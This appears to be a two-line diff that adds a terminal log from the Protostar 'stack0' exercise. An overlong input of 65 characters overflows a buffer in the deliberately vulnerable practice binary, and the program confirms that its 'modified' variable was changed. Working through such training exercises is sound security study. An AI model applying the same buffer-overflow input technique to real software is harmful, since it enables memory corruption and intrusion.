@@ -1,0 +1,2 @@
+user@protostar:/opt/protostar/bin$ python -c 'print "1"*65' | ./stack0 
+you have changed the 'modified' variable
